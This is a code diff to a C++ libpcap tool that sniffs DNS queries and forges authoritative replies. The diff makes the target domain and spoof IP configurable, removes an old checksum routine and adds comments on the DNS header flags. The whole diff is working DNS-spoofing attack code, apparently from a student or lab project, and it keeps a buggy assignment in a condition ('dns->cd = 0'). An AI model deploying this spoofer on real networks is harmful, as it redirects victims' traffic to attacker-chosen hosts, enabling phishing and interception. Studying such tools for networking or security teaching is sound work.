@@ -74,13 +74,10 @@ void NetworkMonitor::setFilter(string filter) {
 void NetworkMonitor::packetCallback(u_char* ptrnull, const struct pcap_pkthdr *pkt_info, const u_char *packet){
 
     //Logger::debug("Packet Found. Now Parsing");
-
-    //struct sniff_ethernet * ethernet = (struct sniff_ethernet*)(packet);
     struct iphdr * ip = (struct iphdr*)(packet + SIZE_ETHERNET);
     //printf("Total Length At Recv: %d\n", ntohs(ip->tot_len));
 
     //switch the ip now to save us work later
-
     in_addr_t sa = (in_addr_t)ip->saddr;
     char oldIPSource[INET_ADDRSTRLEN];
     inet_ntop(AF_INET, &sa, oldIPSource, INET_ADDRSTRLEN);
@@ -102,14 +99,11 @@ void NetworkMonitor::packetCallback(u_char* ptrnull, const struct pcap_pkthdr *p
     ip->id = htons((rand() % 11000) + 29000);
     ip->frag_off = 0;
 
-    //u_int size_ip = IP_HL(ip) * 4;
-    //u_int size_ip = sizeof(*ip) + 2;
-    u_int size_ip2 = (ip->ihl & 0xf) * 4;
+    //get the size of the IP header length
     u_int size_ip = (ip->ihl) * 4;
-    //printf("IHL: %d\n", ip->ihl);
-    //printf("size_ip2: %d\n", size_ip2);
     //printf("size_ip: %d\n", size_ip);
 
+    //get the udp structure
     struct udphdr * udp = (struct udphdr *)(packet + SIZE_ETHERNET + size_ip);
 
     //switch the ports now to save us work later
@@ -117,14 +111,14 @@ void NetworkMonitor::packetCallback(u_char* ptrnull, const struct pcap_pkthdr *p
     int oldSource = ntohs(udp->uh_sport);
     u_int16_t dest = udp->dest;
 
-    //udp->dest = htons(oldSource);
+    //swap the source and destination values
     udp->dest = htons(oldSource);
     udp->source = htons(oldDest);
 
 
     //create dest address struct for sendto
     struct sockaddr_in sin;
-    pseudo_header psh;
+
 
     sin.sin_family = AF_INET;
     sin.sin_port = htons(oldSource);
@@ -141,22 +135,21 @@ void NetworkMonitor::packetCallback(u_char* ptrnull, const struct pcap_pkthdr *p
     dns->ans_count = dns->q_count; //were gonna answer as many questions as there are
 
     //dns->rd = 0;
-    dns->tc = 0;
-    dns->aa = 1;
-    dns->opcode = 0;
-    dns->qr = 1;
-    dns->rcode = 0;
+    dns->tc = 0; // 0 = this message is not truncated
+    dns->aa = 1; // 1 = this is an authoritative reponse
+    dns->opcode = 0; // 0 = means this is for a standard query
+    dns->qr = 1; // 1 = this is a reponse
+    dns->rcode = 0; // 0 = there was no error in processing the request
 
     //dns->cd = 1; //non-authenticated data accepted = 1
-    if(dns->cd = 0){
-        dns->ad = 0;
+    if(dns->cd = 0){ // cd = 0 means unauthenticated data is accepted
+        dns->ad = 0; // ad = 0 means this data was not authenticated
     }else{
-        dns->ad = 1;
+        dns->ad = 1; // ad = 1 means this data was authenticated by the server
     }
 
-    dns->z = 0;
-    dns->ra = 0;
-
+    dns->z = 0; // z value is reversed and always 0
+    dns->ra = 0; //ra = recursion available - we don't wanna mess with that. always 0
 
     //cout << "---------------------------------------------" << endl;
     //cout << "Structures Found Over Packet" << endl;
@@ -177,11 +170,10 @@ void NetworkMonitor::packetCallback(u_char* ptrnull, const struct pcap_pkthdr *p
     //cout << ">" << string(query) << "<" << endl;
 
     int index = 0;
-    QUERY * questionsList = new QUERY[ntohs(dns->q_count)];
-
-
+    QUERY * questionsList = new QUERY[ntohs(dns->q_count)]; //list to store all question query data
     bool foundURL = false; //sets to true when we have found in the question queries the domain we want to spoof
     char * ptr = query;
+
     //Now parse questions out
     for(int i = 0; i < ntohs(dns->q_count); ++i){
 
@@ -238,7 +230,7 @@ void NetworkMonitor::packetCallback(u_char* ptrnull, const struct pcap_pkthdr *p
         //cout << "Class " << ntohs(questionQuery->ques->qclass) << endl;
         //cout << "Type " << ntohs(questionQuery->ques->qtype) << endl;
 
-        if(questionQuery->name.find("bensoer") != string::npos){
+        if(questionQuery->name.find(NetworkMonitor::instance->domain) != string::npos){
             foundURL = true;
         }
 
@@ -279,7 +271,7 @@ void NetworkMonitor::packetCallback(u_char* ptrnull, const struct pcap_pkthdr *p
         fakeResponse->_class = htons(1);
         fakeResponse->ttl = htonl(300);
         fakeResponse->data_len = htons(4); //need to be fixed;
-        fakeResponse->address = inet_addr("142.232.66.1");
+        fakeResponse->address = inet_addr(NetworkMonitor::instance->spoofIP.c_str());
         //YAHOO: 206.190.36.45
 
         //copy in the fake response ?
@@ -304,11 +296,12 @@ void NetworkMonitor::packetCallback(u_char* ptrnull, const struct pcap_pkthdr *p
     //cout << "Original UDP Length: " << ntohs(udp->len) << endl;
     //cout << "Response UDP Length: " << ntohs(rudp->len) << endl;
 
-
+    //prepare the response udp packet for checksum calculation
     rudp->check = 0;
     rudp->uh_sum = 0;
 
     //calculate new checksum for pseudoheader
+    pseudo_header psh;
     psh.dest_address = sin.sin_addr.s_addr;
     psh.source_address = inet_addr(oldIPDestination);
     psh.placeholder = 0;
@@ -427,50 +420,12 @@ unsigned short NetworkMonitor::csum (unsigned short *ptr,int nbytes)
     return(answer);
 }
 
-typedef unsigned short u16;
-typedef unsigned long u32;
 
-unsigned short NetworkMonitor::udp_sum_calc(unsigned short len_udp, unsigned short src_addr[],unsigned short dest_addr[], bool padding, unsigned short buff[])
-{
-    unsigned short prot_udp=17;
-    unsigned short padd=0;
-    unsigned short word16;
-    unsigned long sum;
-
-    // Find out if the length of data is even or odd number. If odd,
-    // add a padding byte = 0 at the end of packet
-    if (padding&1==1){
-        padd=1;
-        buff[len_udp]=0;
-    }
-
-    //initialize sum to zero
-    sum=0;
-
-    // make 16 bit words out of every two adjacent 8 bit words and
-    // calculate the sum of all 16 vit words
-    for (unsigned int i=0;i<len_udp+padd;i=i+2){
-        word16 =((buff[i]<<8)&0xFF00)+(buff[i+1]&0xFF);
-        sum = sum + (unsigned long)word16;
-    }
-    // add the UDP pseudo header which contains the IP source and destinationn addresses
-    for (unsigned int i=0;i<4;i=i+2){
-        word16 =((src_addr[i]<<8)&0xFF00)+(src_addr[i+1]&0xFF);
-        sum=sum+word16;
-    }
-    for (unsigned int i=0;i<4;i=i+2){
-        word16 =((dest_addr[i]<<8)&0xFF00)+(dest_addr[i+1]&0xFF);
-        sum=sum+word16;
-    }
-    // the protocol number and the length of the UDP packet
-    sum = sum + prot_udp + len_udp;
-
-    // keep only the last 16 bits of the 32 bit calculated sum and add the carries
-    while (sum>>16)
-        sum = (sum & 0xFFFF)+(sum >> 16);
-
-    // Take the one's complement of sum
-    sum = ~sum;
-
-    return ((unsigned short) sum);
+void NetworkMonitor::setDomain(string domain) {
+    this->domain = domain;
 }
+
+void NetworkMonitor::setSpoofIP(string spoofIP) {
+    this->spoofIP = spoofIP;
+}
+
